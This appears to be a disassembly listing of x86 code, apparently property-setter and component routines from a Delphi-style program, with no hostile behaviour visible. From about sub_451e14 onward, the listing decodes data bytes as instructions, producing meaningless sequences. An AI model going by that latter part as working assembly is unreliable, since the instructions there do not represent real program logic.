mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_451314
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
movzx eax [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
movzx edx [ edi + 0x94 ]
mov eax edi
call sub_451830
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_451830
sub_4514b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42eb94
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_451504
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4481b0
mov eax [ esi + 0x9c ]
call sub_4481b0
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450d7c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_45155c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424e90
movzx edx [ ebx + 0x95 ]
mov edi esi
mov eax edi
call sub_451668
mov edx [ ebx + 0x64 ]
mov eax edi
call sub_4516c8
movzx edx [ ebx + 0x69 ]
mov eax edi
call sub_451728
movzx edx [ ebx + 0x6a ]
mov eax edi
call sub_451830
mov edx [ ebx + 0x6c ]
mov eax edi
call sub_4518ac
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x78 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4c ]
movzx edx [ ebx + 0x70 ]
mov eax edi
call sub_451904
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_451a1c
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_451a7c
mov eax ebx
call sub_451c74
mov edx eax
mov eax edi
call sub_451c9c
movzx edx [ ebx + 0x84 ]
mov eax edi
call sub_451ad8
movzx edx [ ebx + 0x86 ]
mov eax edi
call sub_451b3c
mov eax [ ebx + 0xc ]
mov [ edi + 0xc ] eax
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x88 ]
mov [ edi + 0x88 ] eax
mov eax [ ebx + 0x8c ]
mov [ edi + 0x8c ] eax
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_451668
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x95 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x95 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4246e8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4246e8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_4516c8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call j_sub_44a294
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_449d2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_451728
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_451820
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_4510e8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_4510d4
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_451728
sub_451830
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx edx [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_4518ac
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x6c ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ ebx + 0x6c ] eax
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_451904
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x70 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x70 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4246e8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4246e8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_45195c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call j_sub_44a294
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_449d2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4246e8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4246e8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_4519c4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_451a1c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call j_sub_44a294
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_449d2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_451a7c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_451ad8
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
movzx eax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_451b3c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x86 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x86 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4483ac
test eax eax
je r-xdata
sub_451b9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call j_sub_44a294
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_42e800
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4516c8
sub_451be8
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_451c10
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_450ee8
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
movzx edx [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_451728
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_451c9c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebx + 0x90 ] eax
sub_451cd0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_451d00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_426a68
mov edi eax
mov eax esi
call sub_4626a0
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_451d2c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_451d70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_451d95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d9c
retn
sub_451dcc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_451e08
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451e0f
retn
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_44a7e8
sub_451e14
push es
add [ eax ] al
add [ ebx + ebx ] dl
dec esi
add [ eax + ecx * 4 + 0x2004e ] bl
add [ eax ] al
adc [ ebx ] bl
dec esi
add [ eax + 0x2004e88 ] ah
add [ eax ] al
add [ ebx + ebx ] cl
dec esi
add [ eax + 0x2004e88 ] bl
add [ eax ] al
add [ eax ] cl
sbb ecx [ esi ]
xchg esp eax
mov [ esi ] cl
add al [ eax ]
add [ eax ] al
add al 0x1b
dec esi
add [ eax + 0x2004e88 ] dl
add [ eax ] al
add [ eax ] al
sbb ecx [ esi ]
mov [ eax + 0x2004e ] cs
add [ eax ] al
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_451e14
call sub_448fc8
sub_451e74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_451e99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451ea0
retn
sub_45207a
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x4004481
mov ecx [ ecx ]
pop esp
jne r-xdata
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd44569db
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ ebx + edx * 4 ] ch
inc ebp
add [ eax - 0x73ffb691 ] al
jne r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
inc ebx
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebx + ecx * 4 + 0x49 ] dl
add [ eax ] cl
jge r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffba6d ] cl
sbb eax 0x2d000049
dec ecx
add al ch
xchg ebx eax
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
fisttp [ eax ]
cwde
insb
jae r-xdata
pop ebx
add [ eax ] al
jmp [ eax - 0x2e ]
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add al bh
xchg ebx eax
inc ebp
add [ ecx ] cl
push esp
inc edi
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x18 ] 0x54004456
add al [ eax ]
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
insb
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add al dl
jno r-xdata
inc edx
add [ edi ] bl
add bh bh
jo r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or eax [ ebx + 0x6f ]
push eax
adc eax [ edx ]
pop edi
add [ eax ] al
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
add dh bh
xchg esp eax
loopne r-xdata
add [ eax ] al
push [ eax ]
inc edx
outsd
js r-xdata
add [ eax ] cl
inc esp
jb r-xdata
dec eax
jb r-xdata
add [ eax - 0xfffffb ] al
adc eax [ eax ]
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al bl
or cl [ ecx ]
nop
test [ ecx ] ah
inc ebp
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
push eax
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
jb r-xdata
cwde
jno r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
outsd
jne r-xdata
push cs
inc esp
imul ebp [ esi + 0x74 ] 0x44561873
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
outsb
jae r-xdata
jl r-xdata
or al 0x49
pop es
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
popad
jo r-xdata
add [ eax - 0x21 ] ch
dec eax
add [ eax - 0x67ffb721 ] ah
add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
jpo r-xdata
inc edx
outsd
js r-xdata
dec ecx
add [ ecx ] al
outsb
je r-xdata
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
jmp [ eax + 0x48 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + ebx + 0x56 ]
inc esp
add ah ah
add [ eax ] eax
call [ eax + 0x52 ]
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
inc ebp
add al al
sub [ ecx ] ecx
aam 0x27
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
mov [ ebx + 0x1de40045 ] dl
dec ecx
add [ eax ] al
sub eax 0x93e80049
and [ ebp ] al
adc [ eax ] ah
inc ebp
add [ ecx ] al
or [ ebx + 0x74 ] dl
dec eax
outsb
add [ eax ] al
add [ eax + 0x1 ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add bh bh
loopne r-xdata
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
loopne r-xdata
outsb
je r-xdata
jb r-xdata
jne r-xdata
push ds
add [ eax ] dl
push eax
popad
jb r-xdata
add [ eax + 0x1 ] al
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001c ] al
outsd
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x440e0017 ] al
jpe r-xdata
push 0x49
add [ ebx + ebp * 2 ] ch
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
add [ es : eax ] cl
outsb
je r-xdata
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
popad
jb r-xdata
add [ eax + edx * 2 ] dl
outsd
insb
outsd
jb r-xdata
je r-xdata
outsb
sbb [ fs : esi + 0x44 ] dl
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
jle r-xdata
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
outsb
je r-xdata
inc [ edi + ebx * 8 + 0x48 ]
pop ds
inc esi
add [ eax + eax ] bh
push 0x6948776f
jpe r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
outsb
je r-xdata
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
sub [ eax ] eax
pop es
jo r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or edx [ eax + 0x61 ]
push esi
inc esp
add ch ah
add [ eax ] eax
inc [ eax + 0x100496a ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
adc al 0x50
outsb
je r-xdata
outsb
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
add [ ebp + 0x49 ] bh
add al cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ecx + eax + 0x7e00ff00 ] dh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5007001d ] al
add bh bh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
push eax
popad
jb r-xdata
add [ esi ] cl
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
and al 0x0
push cs
add [ eax + 0x1 ] al
outsd
jne r-xdata
loopne r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ ecx ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ edx ] bl
add bh bh
je r-xdata
add bh bh
shl al 0x48
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
